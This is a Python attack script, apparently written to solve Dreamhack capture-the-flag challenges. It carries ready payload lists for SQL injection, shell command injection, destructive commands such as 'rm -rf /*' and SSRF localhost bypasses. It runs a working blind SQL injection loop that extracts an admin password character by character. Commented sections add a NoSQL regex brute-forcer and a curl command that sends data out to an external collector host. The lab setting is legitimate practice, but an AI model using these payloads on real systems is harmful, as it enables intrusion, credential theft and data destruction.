import requests
import re
import string, json

host = 'http://host3.dreamhack.games'
port = '8402'
url = host+':'+port
headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {
        'username': 'admin',
        'sessionid': '20642b2f8484ec17cb44fa25680ead4791ac6bfedc29f04de00d364cf4d70c5f'}
data = {'cmd': 'ls'
        #'host': '8.8.8.8";cat "/app/flag.py'
        }
payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
              'admin\' OR 1 -- -',              # admin' OR 1 -- -
              '" OR "" = "',                    # " OR "" = "
              '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
              '\'=\'',                          # '='
              '\'LIKE\'',                       # 'LIKE'
              '\'=0--+'                         #'=0--+
              ]
payloadCommandInjection = [';ls "."',           # ;ls "."
                           '";ls ".',           # ";ls ".
                           ';pwd',              # ;pwd
                           '";pwd "',           # ";pwd "
                           ';cat /tmp/flag',    # ;cat /tmp/flag
                           '";cat /tmp/flag'    # ";cat /tmp/flag
                           ]
payloadCommand = ['rm ./',
                  'rm -rf ./*',
                  'rm -rf /*',
                  'cp -rf ./* ../',
                  'cat /',
                  'clear',
                  'ping http://localhost',
                  'whois https://naver.com',
                  '가나다']


payloadLocalhost = ['http://localhost',
                    'http://vcap.me',
                    'http://0x7f.0x00.0x00.0x01',
                    'http://0x7f000001',
                    'http://2130706433',
                    'http://Localhost',
                    'http://127.0.0.255'
                    'http://127.1',
                    ]
ALPHANUMERIC = string.digits + string.ascii_letters
flag = ''
def refineResponse(text):
    text = re.sub('<head>(.|\n)*</head>', '', text)
    text = re.sub('\n(\n|\s)*\n', '', text)
    return text
def detector(text):
    regex_flag = re.compile('(DH\{.*\}|Success|error)')
    detectedTexts = regex_flag.findall(response.text)
    return detectedTexts

def printLog(payload, responseText):
    print("================================================================")
    print("payload: " + payload)
    print(response.text)

################################ CANVAS  ################################
def existDetector(text):
    regex_exist = re.compile('exists')
    detectedTexts = regex_exist.findall(text)
    return detectedTexts
pwLength = 0
for index in range(50):
    payload = 'admin\' and char_length(upw)='+str(index)+';--'
    params = {
        'uid': payload}
    response = requests.get(url, params = params, verify=False)
    printLog(payload, refineResponse(response.text))
    if len(existDetector(response.text))>0:
        pwLength = index
        break

for nthPw in range(1, pwLength+1):
    for index in range(128):
        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(index)+';--'
        params = {'uid': payload}
        response = requests.get(url, params = params, verify=False)
        #printLog('nthPw: '+str(nthPw)+', index: '+str(index), refineResponse(response.text))
        if len(existDetector(response.text))>0:
            print(str(nthPw)+'th password: '+str(index))
            break

################################ PALETTE ################################

# response = requests.get(url, params = params, cookies=cookies, verify=False)
# response = requests.post(url, data=data)
# response = requests.head(url, verify=False)
# verify=False SSL 인증서 에러가 나서 추가해줬다.

# Blind injection
#for i in range(32):
#    for char in ALPHANUMERIC:
#        response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
#        if response.text.find('admin')!=-1:
#            flag += char
#            print(str(char))
#            break

################################ HISTORY ################################
#for payload in payloadCommandInjection:
#    data = {'host': '8.8.8.8'+payload}
#    response = requests.post(url, data=data)
#

#if len(regex_flag.findall(response.text))>0:
#    print(regex_flag.findall(response.text))
#else:
#    print(response.text)

#for param in payloadCommand:
#    params = {'cmd': param}
#    print("================================================================")
#    print("Command injection payload: " + param)
#    print(refineResponse(response.text))

# response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
